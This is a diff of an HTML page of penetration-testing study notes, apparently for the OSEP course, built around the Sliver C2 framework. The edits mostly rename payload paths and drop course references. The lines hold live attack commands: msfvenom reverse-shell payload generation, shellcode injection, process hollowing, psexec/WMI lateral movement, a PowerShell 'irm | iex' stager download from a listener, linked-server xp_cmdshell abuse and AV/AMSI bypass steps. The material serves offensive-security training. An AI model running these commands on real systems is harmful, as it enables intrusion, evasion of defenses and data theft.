@@ -16,13 +16,13 @@
   <link href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.28.0/themes/prism-tomorrow.min.css" rel="stylesheet" />
   <link href="./css/style.css" rel="stylesheet">
   <meta property="og:title" content="OSEP Notes">
-  <meta property="og:description" content="Evasion Techniques and Breaching Defenses (PEN-300) study notes with Sliver C2.">
+  <meta property="og:description" content="Evasion and defense bypass notes with Sliver C2.">
   <meta property="og:image" content="./img/osep_icon.png">
   <meta property="og:url" content="./osep.html">
   <meta property="og:type" content="website">
   <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:title" content="OSEP Notes">
-  <meta name="twitter:description" content="Evasion Techniques and Breaching Defenses (PEN-300) study notes with Sliver C2.">
+  <meta name="twitter:description" content="Evasion and defense bypass notes with Sliver C2.">
   <meta name="twitter:image" content="./img/osep_icon.png">
   <style>
   .section-flow-1,.section-flow-2,.section-flow-3,.section-flow-4,.section-flow-5,
@@ -204,7 +204,7 @@ sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=[listener-ip] LPORT=[list
 
 <h3 id="os-win32-apis">1.5 Win32 APIs</h3>
 
-<p>The Win32 API is the primary interface between user-mode applications and the Windows operating system. Every offensive technique in this course — shellcode execution, process injection, token manipulation — ultimately calls Win32 API functions exported by system DLLs like <code>kernel32.dll</code>, <code>ntdll.dll</code>, and <code>advapi32.dll</code>.</p>
+<p>The Win32 API is the primary interface between user-mode applications and the Windows operating system. Every offensive technique in this section — shellcode execution, process injection, token manipulation — ultimately calls Win32 API functions exported by system DLLs like <code>kernel32.dll</code>, <code>ntdll.dll</code>, and <code>advapi32.dll</code>.</p>
 
 <p>Each API function has a documented prototype specifying its parameters and return type. Microsoft defines custom data types that map to standard C types. Functions that handle strings come in two variants: an <strong>A suffix</strong> (ANSI/ASCII, e.g., <code>GetUserNameA</code>) and a <strong>W suffix</strong> (Wide/Unicode UTF-16, e.g., <code>GetUserNameW</code>). Modern Windows uses Unicode internally, so W variants are preferred.</p>
 
@@ -355,7 +355,7 @@ http -L [listener-ip] --lport [listener-port]</code></pre>
 <ul class="methodology-checklist">
   <li>
     <label><input type="checkbox"> Generate raw 64-bit Meterpreter shellcode via msfvenom (connects to Sliver stage-listener)</label>
-    <pre><code class="language-bash">sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=[stage-port] EXITFUNC=thread -f raw -o /home/kali/OSEP/sliver.x64.bin</code></pre>
+    <pre><code class="language-bash">sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=[stage-port] EXITFUNC=thread -f raw -o /home/kali/payloads/sliver.x64.bin</code></pre>
   </li>
   <li>
     <label><input type="checkbox"> XOR-encode shellcode for embedding in a C# loader (key 2)</label>
@@ -371,7 +371,7 @@ http -L [listener-ip] --lport [listener-port]</code></pre>
   </li>
   <li>
     <label><input type="checkbox"> Generate raw 32-bit Meterpreter shellcode via msfvenom for x86 targets</label>
-    <pre><code class="language-bash">sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=[stage-port] EXITFUNC=thread -f raw -o /home/kali/OSEP/sliver.x86.bin</code></pre>
+    <pre><code class="language-bash">sudo msfvenom -p windows/meterpreter/reverse_tcp LHOST=tun0 LPORT=[stage-port] EXITFUNC=thread -f raw -o /home/kali/payloads/sliver.x86.bin</code></pre>
   </li>
 </ul>
 
@@ -406,15 +406,15 @@ sliver ([session-name]) > ps -e notepad</code></pre>
   </li>
   <li>
     <label><input type="checkbox"> If migrate fails, inject x64 shellcode into the target PID</label>
-    <pre><code class="language-bash">sliver ([session-name]) > execute-shellcode -S -r -I 10 -p [pid] /home/kali/OSEP/sliver.x64.bin</code></pre>
+    <pre><code class="language-bash">sliver ([session-name]) > execute-shellcode -S -r -I 10 -p [pid] /home/kali/payloads/sliver.x64.bin</code></pre>
   </li>
   <li>
     <label><input type="checkbox"> Inject x86 shellcode into an x86 target process</label>
-    <pre><code class="language-bash">sliver ([session-name]) > execute-shellcode -A 386 -p [pid] /home/kali/OSEP/sliver.x86.bin</code></pre>
+    <pre><code class="language-bash">sliver ([session-name]) > execute-shellcode -A 386 -p [pid] /home/kali/payloads/sliver.x86.bin</code></pre>
   </li>
   <li>
     <label><input type="checkbox"> Use process hollowing when AV is active (hollow is recommended)</label>
-    <pre><code class="language-bash">sliver ([session-name]) > hollow svchost.exe /home/kali/OSEP/sliver.x64.bin</code></pre>
+    <pre><code class="language-bash">sliver ([session-name]) > hollow svchost.exe /home/kali/payloads/sliver.x64.bin</code></pre>
   </li>
 </ul>
 
@@ -477,7 +477,7 @@ sliver ([session-name]) > sharpsh -t 20 -- '-c "$ExecutionContext.SessionState.L
   </li>
   <li>
     <label><input type="checkbox"> Run jump-psexec BOF for lateral movement to a remote host</label>
-    <pre><code class="language-bash">sliver ([session-name]) > jump-psexec [target-hostname] [service-name] /home/kali/OSEP/sliver.x64.exe //[target-hostname]/c$/[filename].exe</code></pre>
+    <pre><code class="language-bash">sliver ([session-name]) > jump-psexec [target-hostname] [service-name] /home/kali/payloads/sliver.x64.exe //[target-hostname]/c$/[filename].exe</code></pre>
   </li>
   <li>
     <label><input type="checkbox"> Run jump-wmiexec BOF to execute a PowerShell payload over WMI</label>
@@ -618,7 +618,7 @@ sliver > use [new-session-id]</code></pre>
   </li>
   <li>
     <label><input type="checkbox"> Use jump BOFs for inline service or WMI execution</label>
-    <pre><code class="language-bash">sliver (SESSION) > jump-psexec [target] AgentSvc /home/kali/OSEP/sliver.x64.exe //[target]/c$/sliver.x64.exe
+    <pre><code class="language-bash">sliver (SESSION) > jump-psexec [target] AgentSvc /home/kali/payloads/sliver.x64.exe //[target]/c$/sliver.x64.exe
 sliver (SESSION) > jump-wmiexec [target] 'powershell -enc [base64-cradle]'</code></pre>
   </li>
 </ul>
@@ -2869,7 +2869,7 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserv
   <li>
     <label><input type="checkbox"> Alternatively, use Sliver execute-shellcode to inject directly without staging a DLL</label>
     <pre><code class="language-bash">sliver ([session]) > ps -e explorer
-sliver ([session]) > execute-shellcode -p [pid] /home/kali/OSEP/sliver.x64.bin</code></pre>
+sliver ([session]) > execute-shellcode -p [pid] /home/kali/payloads/sliver.x64.bin</code></pre>
   </li>
 </ul>
 
@@ -3048,7 +3048,7 @@ namespace Hollow
   </li>
   <li>
     <label><input type="checkbox"> Use Sliver's built-in hollow command as the preferred operational approach</label>
-    <pre><code class="language-bash">sliver ([session]) > hollow svchost.exe /home/kali/OSEP/sliver.x64.bin</code></pre>
+    <pre><code class="language-bash">sliver ([session]) > hollow svchost.exe /home/kali/payloads/sliver.x64.bin</code></pre>
   </li>
   <li>
     <label><input type="checkbox"> Note: the hollow command may return an RPC error but the shell still arrives — this is expected</label>
@@ -3084,15 +3084,15 @@ sliver ([session]) > ps -e notepad</code></pre>
   </li>
   <li>
     <label><input type="checkbox"> Inject x64 shellcode into an existing process (fallback if migrate fails)</label>
-    <pre><code class="language-bash">sliver ([session]) > execute-shellcode -S -r -I 10 -p [pid] /home/kali/OSEP/sliver.x64.bin</code></pre>
+    <pre><code class="language-bash">sliver ([session]) > execute-shellcode -S -r -I 10 -p [pid] /home/kali/payloads/sliver.x64.bin</code></pre>
   </li>
   <li>
     <label><input type="checkbox"> Inject x86 shellcode (32-bit target process)</label>
-    <pre><code class="language-bash">sliver ([session]) > execute-shellcode -A 386 -p [pid] /home/kali/OSEP/sliver.x86.bin</code></pre>
+    <pre><code class="language-bash">sliver ([session]) > execute-shellcode -A 386 -p [pid] /home/kali/payloads/sliver.x86.bin</code></pre>
   </li>
   <li>
     <label><input type="checkbox"> Use process hollowing for maximum evasion in AV-present environments</label>
-    <pre><code class="language-bash">sliver ([session]) > hollow svchost.exe /home/kali/OSEP/sliver.x64.bin</code></pre>
+    <pre><code class="language-bash">sliver ([session]) > hollow svchost.exe /home/kali/payloads/sliver.x64.bin</code></pre>
   </li>
   <li>
     <label><input type="checkbox"> Get explorer PID for a stable, long-lived injection target</label>
@@ -3855,7 +3855,7 @@ try {
   </li>
   <li>
     <label><input type="checkbox"> If the DLL hijack method is used and Defender detects the "amsi.dll" process, immediately migrate the implant to a stable process before Defender kills it</label>
-    <pre><code class="language-powershell">sliver (SESSION) > hollow svchost.exe /home/kali/OSEP/sliver.x64.bin</code></pre>
+    <pre><code class="language-powershell">sliver (SESSION) > hollow svchost.exe /home/kali/payloads/sliver.x64.bin</code></pre>
   </li>
   <li>
     <label><input type="checkbox"> Clean up amsi.dll and registry key after exploitation</label>
@@ -3887,7 +3887,7 @@ reg delete "HKCU\Software\Microsoft\Windows Script\Settings" /v AmsiEnable /f</c
   </li>
   <li>
     <label><input type="checkbox"> After disabling Defender, perform process hollowing into a stable system process to maintain persistence</label>
-    <pre><code class="language-powershell">sliver (SESSION) > hollow svchost.exe /home/kali/OSEP/sliver.x64.bin</code></pre>
+    <pre><code class="language-powershell">sliver (SESSION) > hollow svchost.exe /home/kali/payloads/sliver.x64.bin</code></pre>
   </li>
 </ul>
 
@@ -4818,7 +4818,7 @@ sliver > https -L 0.0.0.0 --lport 443</code></pre>
 
 <p>DNS tunneling encapsulates arbitrary data inside DNS query and response packets, allowing bidirectional communication through environments that permit DNS traffic but block all other outbound protocols. Because the client cannot receive unsolicited DNS responses, tunneling tools use a polling model: the client continuously queries the authoritative server for new commands and submits command output via new DNS lookups. Data is typically hex-encoded and split across multiple queries when it exceeds the per-label limit of 63 characters.</p>
 
-<p>dnscat2 is the standard tool for DNS tunneling in OSEP. It supports TXT, CNAME, and MX record types and can tunnel arbitrary TCP/IP traffic in addition to providing a built-in command shell. To operate, the attacker's DNS server must be registered as the authoritative nameserver (NS record) for a domain they control, so that DNS requests for subdomains of that domain are forwarded to the dnscat2 server.</p>
+<p>dnscat2 is a standard tool for DNS tunneling. It supports TXT, CNAME, and MX record types and can tunnel arbitrary TCP/IP traffic in addition to providing a built-in command shell. To operate, the attacker's DNS server must be registered as the authoritative nameserver (NS record) for a domain they control, so that DNS requests for subdomains of that domain are forwarded to the dnscat2 server.</p>
 
 <table class="custom-table">
 <thead><tr><th>DNS Field</th><th>Tunneling Use</th><th>Limit</th></tr></thead>
@@ -5009,7 +5009,7 @@ xfreerdp /u:[user] /p:[password] /v:[internal-ip] /cert:ignore /dynamic-resoluti
 </ul>
 
 <h2 id="windows-post-exploitation">12. Windows Privilege Escalation</h2>
-<p>PEN-200 treats Windows privilege escalation as an enumeration-first process. Confirm identity, groups, privileges, integrity level, OS build, installed applications, services, scheduled tasks, and stored credentials before reaching for exploit code. Misconfigurations are the normal path; kernel exploits are the fallback after patch level and exploit reliability are confirmed.</p>
+<p>Windows privilege escalation is an enumeration-first process. Confirm identity, groups, privileges, integrity level, OS build, installed applications, services, scheduled tasks, and stored credentials before reaching for exploit code. Misconfigurations are the normal path; kernel exploits are the fallback after patch level and exploit reliability are confirmed.</p>
 <h3 id="winpe-situational-awareness">12.1 Enumeration</h3>
 <p>Start by building a local map of the host: who you are, what privileges are assigned, what is running, what can be modified, and what credentials or admin sessions already exist.</p>
 <h4>Methodology</h4>
@@ -5043,7 +5043,7 @@ Import-Module .\PowerUp.ps1; Invoke-AllChecks
 </li>
 </ul>
 <h3 id="winpe-services">12.2 Service Misconfigurations</h3>
-<p>Services are high-value because they often run as LocalSystem or a privileged service account. PEN-200 focuses on service binary hijacking, weak service permissions, and unquoted service paths.</p>
+<p>Services are high-value because they often run as LocalSystem or a privileged service account. Common service escalation paths include service binary hijacking, weak service permissions, and unquoted service paths.</p>
 <table class="custom-table">
 <thead><tr><th>Vector</th><th>Condition</th><th>Abuse</th></tr></thead>
 <tbody>
@@ -5096,7 +5096,7 @@ Get-Date</code></pre>
 </li>
 </ul>
 <h3 id="winpe-seimpersonate">12.4 Token Impersonation (Potatoes)</h3>
-<p>Service accounts such as IIS application pools, MSSQL services, and other service contexts commonly hold <code>SeImpersonatePrivilege</code>. PEN-200 demonstrates this class with potato-style named-pipe impersonation, where a privileged authentication is coerced to a local listener and the resulting token is used to execute a command as SYSTEM.</p>
+<p>Service accounts such as IIS application pools, MSSQL services, and other service contexts commonly hold <code>SeImpersonatePrivilege</code>. This class is commonly abused with potato-style named-pipe impersonation, where a privileged authentication is coerced to a local listener and the resulting token is used to execute a command as SYSTEM.</p>
 <h4>Methodology</h4>
 <ul class="methodology-checklist">
 <li><label><input type="checkbox"/> Confirm impersonation privileges</label>
@@ -5666,7 +5666,7 @@ tar xf /tmp/rootfiles.tar -C /tmp</code></pre>
 </li>
 </ul>
 <h3 id="linpe-insecure-components">13.13 Dangerous Group Memberships</h3>
-<p>PEN-200 highlights insecure components such as privileged SUID programs, special sudo permissions, kernel vulnerabilities, and service-specific escalation paths. Treat these as context-dependent findings that require version and permission checks.</p>
+<p>High-value insecure components include privileged SUID programs, special sudo permissions, kernel vulnerabilities, and service-specific escalation paths. Treat these as context-dependent findings that require version and permission checks.</p>
 <h4>Methodology</h4>
 <ul class="methodology-checklist">
 <li><label><input type="checkbox"/> Check group memberships that can cross privilege boundaries</label>
@@ -7194,7 +7194,7 @@ sliver ([session]) > migrate -p [pid]</code></pre>
   <li>
     <label><input type="checkbox"> Steal token by injecting shellcode into an existing user's process</label>
     <pre><code class="language-bash">sliver ([session]) > ps -e explorer
-sliver ([session]) > execute-shellcode -S -r -I 30 -p [pid] /home/kali/OSEP/sliver.x64.bin</code></pre>
+sliver ([session]) > execute-shellcode -S -r -I 30 -p [pid] /home/kali/payloads/sliver.x64.bin</code></pre>
   </li>
   <li>
     <label><input type="checkbox"> Verify the current token/identity after impersonation</label>
@@ -7231,7 +7231,7 @@ sliver ([new-session]) > sa-whoami</code></pre>
   </li>
   <li>
     <label><input type="checkbox"> Use jump-psexec BOF for inline execution (requires implant already on disk at UNC path)</label>
-    <pre><code class="language-bash">sliver ([session]) > jump-psexec [target] AgentSvc /home/kali/OSEP/sliver.x64.exe //[target]/c$/sliver.x64.exe</code></pre>
+    <pre><code class="language-bash">sliver ([session]) > jump-psexec [target] AgentSvc /home/kali/payloads/sliver.x64.exe //[target]/c$/sliver.x64.exe</code></pre>
   </li>
 </ul>
 
@@ -8399,7 +8399,7 @@ SELECT mylogin FROM OPENQUERY("[server-b]",
   -l "[sql02];[sql01];[sql02]" powershell "irm http://[listener-ip]:[listener-port]/[stager].ps1 | iex"</code></pre>
   </li>
   <li>
-    <label><input type="checkbox"> Alternatively exploit with nested AT statements (manual, for exam understanding)</label>
+    <label><input type="checkbox"> Alternatively exploit with nested AT statements for manual understanding</label>
     <pre><code class="language-sql">-- Enable xp_cmdshell on server-a via the B->A path
 EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT [server-a]') AT [server-b];
 EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT [server-a]') AT [server-b];
@@ -8409,7 +8409,7 @@ EXEC ('EXEC (''xp_cmdshell ''''powershell -enc [base64-cradle]'''';'') AT [serve
 
 <h3 id="mssqland-tool">18.11 MSSQLand — Setup and Full Reference</h3>
 
-<p>MSSQLand is the recommended .NET assembly for all MSSQL attacks in OSEP labs and the exam. It handles impersonation across multiple linked server hops, maps link chains automatically, and wraps all common attack actions (whoami, xp_cmdshell, CLR assembly, SMB capture, PowerShell execution, database search). It is loaded into Sliver as a custom alias so it can be called as <code>mssqland</code> directly from any session.</p>
+<p>MSSQLand is the recommended .NET assembly for MSSQL attack workflows in these notes. It handles impersonation across multiple linked server hops, maps link chains automatically, and wraps all common attack actions (whoami, xp_cmdshell, CLR assembly, SMB capture, PowerShell execution, database search). It is loaded into Sliver as a custom alias so it can be called as <code>mssqland</code> directly from any session.</p>
 
 <h4>18.11.1 Custom Alias Setup</h4>
 <ol>
@@ -9013,7 +9013,7 @@ Get-DomainSID -Domain [root-domain]</code></pre>
 
 <h2 id="active-directory-exploitation">20. Active Directory Exploitation</h2>
 
-<p>Active Directory exploitation turns enumeration findings into access. The main attack families from PEN-200 and PEN-300 are Kerberos roasting, NTLM capture and relay, ACL abuse, delegation abuse, lateral movement with hashes or tickets, domain credential extraction, forest trust abuse, and bypassing AD-adjacent hardening such as JEA and JIT.</p>
+<p>Active Directory exploitation turns enumeration findings into access. The main attack families are Kerberos roasting, NTLM capture and relay, ACL abuse, delegation abuse, lateral movement with hashes or tickets, domain credential extraction, forest trust abuse, and bypassing AD-adjacent hardening such as JEA and JIT.</p>
 
 <h3 id="ad-exploit-auth-overview">20.1 Authentication Attack Map</h3>
 <table class="custom-table">
